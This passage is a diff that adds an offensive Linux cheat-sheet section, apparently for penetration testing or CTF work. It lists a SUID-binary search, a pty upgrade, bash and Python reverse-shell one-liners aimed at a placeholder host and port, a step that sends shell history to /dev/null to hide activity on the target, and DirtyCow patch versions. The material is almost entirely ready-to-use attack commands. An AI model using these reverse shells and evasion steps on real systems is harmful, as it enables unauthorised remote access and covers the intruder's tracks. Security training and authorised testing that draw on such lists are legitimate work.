@@ -1,0 +1,45 @@
+=== Linux
+==== Find interesting things
+
+   find / -perm /6000 -type f 2>/dev/null
+
+SUID binaries
+
+==== TTYs
+
+  python -c 'import pty; pty.spawn("/bin/bash")'
+
+Upgrade your current session to one with a pty.
+
+==== Reverse Shells
+
+===== Bash
+
+  bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
+
+The first `bash` has to be bash, to get the tcp support used later on. The second `bash` could be any other shell or program.
+
+===== Python
+
+  python -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
+  s.connect(("127.0.0.1", 4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); \
+  os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash"); \
+  s.close()'
+
+This also sets up the tty from earlier and "nulls out" the path to the history file, so your commands aren't saved on the target.
+
+==== Exploits
+===== CVE-2016-5195 DirtyC0w
+
+Patched in:
+
+|===
+|4.8.0-26.28 |Ubuntu 16.10
+|4.4.0-45.66 |Ubuntu 16.04 LTS
+|3.13.0-100.147 |Ubuntu 14.04 LTS
+|3.2.0-113.155 |Ubuntu 12.04 LTS
+|3.16.36-1+deb8u2 |Debian 8
+|3.2.82-1 |Debian 7
+|4.7.8-1 |Debian unstable
+|===
+
